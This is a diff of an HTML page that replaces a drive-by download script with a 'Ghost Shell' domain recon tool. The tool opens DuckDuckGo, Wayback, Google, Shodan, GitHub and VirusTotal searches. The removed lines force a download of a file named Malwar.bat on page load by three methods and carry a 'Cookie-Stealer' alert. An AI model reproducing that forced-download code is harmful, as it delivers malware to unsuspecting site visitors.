@@ -1,25 +1,189 @@
-<a id="malwareLink" href="https://github.com/Ghost00Shell/Ghost___Shell/releases/download/testok/Malwar.bat" target="_blank" download></a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🏆Ghost Shell🏆</title>
+    <style>
+        body {
+            background-color: #000;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #ff00ff, #00ffff, #ff4500, #ffd700, #32cd32); /* Multi-color gradient */
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: gold;
+            text-shadow: 1px 1px 3px #000, 0 0 5px rgba(255, 255, 255, 0.5); /* Subtle glow */
+        }
+        input {
+            padding: 10px;
+            font-size: 1em;
+            border: 2px solid transparent;
+            border-radius: 5px;
+            background: linear-gradient(45deg, #222, #333);
+            color: #ffd700;
+            width: 80%;
+            max-width: 300px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 10px gold, 0 0 5px gold;
+        }
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 10px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        button {
+            padding: 15px;
+            font-size: 1em;
+            background: transparent;
+            color: #ffd700;
+            border: 2px solid;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s, color 0.3s;
+        }
+        button:hover {
+            color: #000;
+        }
+        /* Unique colors for each button */
+        #duckduckgo { border-color: #ff4500; } /* Orange */
+        #duckduckgo:hover { background: #ff4500; }
+        #wayback { border-color: #00ced1; } /* Turquoise */
+        #wayback:hover { background: #00ced1; }
+        #waybackScript { border-color: #1e90ff; } /* Dodger Blue */
+        #waybackScript:hover { background: #1e90ff; }
+        #google { border-color: #32cd32; } /* Lime Green */
+        #google:hover { background: #32cd32; }
+        #shodan { border-color: #ff00ff; } /* Magenta */
+        #shodan:hover { background: #ff00ff; }
+        #github { border-color: #9400d3; } /* Dark Violet */
+        #github:hover { background: #9400d3; }
+        #virustotal { border-color: #00ff7f; } /* Spring Green */
+        #virustotal:hover { background: #00ff7f; }
+        #openAll { border-color: #ffd700; } /* Gold */
+        #openAll:hover { background: #ffd700; }
+        
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.8em;
+            }
+            input {
+                width: 90%;
+            }
+            .button-grid {
+                grid-template-columns: 1fr;
+            }
+            button {
+                padding: 12px;
+                font-size: 0.9em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 Ghost Shell Search Tool 🏆</h1>
+        <input type="text" id="domainInput" placeholder="🌍 Enter a domain">
+        <div class="button-grid">
+            <button id="duckduckgo" onclick="searchDuckDuckGo()">🦆 DuckDuckGo Leaks</button>
+            <button id="wayback" onclick="searchWayback()">⏳ Wayback Archive Leaks</button>
+            <button id="waybackScript" onclick="searchWaybackScript()">📜 Wayback Script Leaks</button>
+            <button id="google" onclick="searchGoogle()">🔎 Google Leaks</button>
+            <button id="shodan" onclick="searchShodan()">🌐 Shodan Leaks</button>
+            <button id="github" onclick="searchGitHub()">🐙 GitHub Leaks</button>
+            <button id="virustotal" onclick="searchVirusTotal()">🛡️ VirusTotal</button>
+            <button id="openAll" onclick="openAll()">🚀 Open All</button>
+        </div>
+    </div>
 
-<script>
-  setTimeout(() => {
-    // Show an alert with the user's cookies
-    alert("Cookies: " + "Cookie-Stealer");
+    <script>
+        function getDomain() {
+            const input = document.getElementById('domainInput').value.trim();
+            if (!input) {
+                alert('Please enter a domain! ⚠️');
+                return null;
+            }
+            return input.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+        }
 
-    // Attempt 1: Simulate a click on the link
-    document.getElementById("malwareLink").click();
+        function searchDuckDuckGo() {
+            const domain = getDomain();
+            if (domain) {
+                const query = `site:${domain}`;
+                window.open(`https://duckduckgo.com/?q=${encodeURIComponent(query)}`, '_blank');
+            }
+        }
 
-    // Attempt 2: Open the download link in a new tab
-    window.open("https://github.com/Ghost00Shell/Ghost___Shell/releases/download/testok/Malwar.bat");
+        function searchWayback() {
+            const domain = getDomain();
+            if (domain) {
+                window.open(`https://web.archive.org/web/*/${domain}*`, '_blank');
+            }
+        }
 
-    // Attempt 3: Create an invisible link and click it
-    let a = document.createElement("a");
-    a.href = "https://github.com/Ghost00Shell/Ghost___Shell/releases/download/testok/Malwar.bat";
-    a.download = "";
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-  }, 1000); // Trigger after 1 second
-</script>
+        function searchWaybackScript() {
+            const domain = getDomain();
+            if (domain) {
+                window.open(`https://web.archive.org/cdx/search/cdx?url=${domain}%2F*&output=text&fl=original&collapse=urlkey&filter=statuscode%3A200`, '_blank');
+            }
+        }
 
+        function searchGoogle() {
+            const domain = getDomain();
+            if (domain) {
+                const query = `site:${domain}`;
+                window.open(`https://www.google.com/search?q=${encodeURIComponent(query)}`, '_blank');
+            }
+        }
 
-<!--<script src="https://gotphp.com/dom.js"></script>
+        function searchShodan() {
+            const domain = getDomain();
+            if (domain) {
+                const query = `hostname:${domain}`;
+                window.open(`https://www.shodan.io/search?query=${encodeURIComponent(query)}`, '_blank');
+            }
+        }
+
+        function searchGitHub() {
+            const domain = getDomain();
+            if (domain) {
+                const query = `${domain}`;
+                window.open(`https://github.com/search?q=${encodeURIComponent(query)}&type=code`, '_blank');
+            }
+        }
+
+        function searchVirusTotal() {
+            const domain = getDomain();
+            if (domain) {
+                window.open(`https://www.virustotal.com/gui/domain/${encodeURIComponent(domain)}/relations`, '_blank');
+            }
+        }
+
+        function openAll() {
+            const domain = getDomain();
+            if (domain) {
+                searchDuckDuckGo();
+                searchWayback();
+                searchWaybackScript();
+                searchGoogle();
+                searchShodan();
+                searchGitHub();
+                searchVirusTotal();
+            }
+        }
+    </script>
+</body>
+</html>
